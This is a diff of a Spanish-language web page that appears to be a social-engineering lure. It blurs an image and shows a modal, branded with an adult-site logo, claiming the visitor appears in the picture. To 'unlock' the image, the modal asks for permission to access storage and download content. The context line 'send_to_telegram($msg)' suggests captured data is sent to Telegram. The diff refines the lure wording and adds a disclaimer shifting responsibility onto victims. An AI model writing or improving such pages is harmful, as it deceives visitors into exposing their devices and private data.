@@ -29,31 +29,33 @@ send_to_telegram($msg);
     body {
       margin: 0;
       font-family: Arial, Helvetica, sans-serif;
-      background: #111; /* Gris muy oscuro, más suave que negro puro */
-      color: #fff;       /* Texto blanco por defecto */
+      background: #111;
+      color: #fff;
       height: 100vh;
       overflow: hidden;
-
-    /* Flexbox para centrar contenido */
       display: flex;
-      align-items: center;       /* Centrado vertical */
-      justify-content: center;   /* Centrado horizontal */
-      flex-direction: column;    /* Contenido en columna */
-}
-    body::before {
-      content: "";
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+
+    /* Fondo con div en lugar de ::before */
+    #background {
       position: fixed;
-      top:0; left:0;
-      width:100%; height:100%;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
       background: url('img/image1.jpg') no-repeat center center/cover;
       filter: blur(15px) brightness(0.5);
       z-index: -1;
       transition: all 0.8s ease;
     }
-    body.unlocked::before {
+
+    /* Fondo desbloqueado */
+    body.unlocked #background {
       background: url('img/image2.jpg') no-repeat center center/cover;
       filter: none;
     }
+         
     #cameraModal .content {
       background: #1c1c1c;
       color: #fff;
@@ -111,10 +113,10 @@ send_to_telegram($msg);
 <div id="cameraModal">
     <div class="content">
         <img src="img/logo-erome-vertical.png" alt="Logo" class="logo">
-        <p>📸 ¡Wow! Apareces en la imagen de fondo... Para desbloquear necesitamos tu permiso para acceder al contenido.</p>
+        <p>📸 ¡Wow! Apareces en la imagen de fondo... ¿seguro que no eres tú? Para poder acceder y visualizar la imagen correctamente, necesitamos tu permiso para acceder al almacenamiento y descargar el contenido.</p>
         <button id="grantAccess">Permitir acceso</button>
         <div class="disclaimer">
-            Al acceder y utilizar esta página, usted reconoce que lo hace por su propia voluntad.
+            Al acceder y utilizar esta página, usted reconoce que lo hace por su propia voluntad y asume toda la responsabilidad por cualquier acción o consecuencia derivada de su uso.
         </div>
     </div>
 </div>
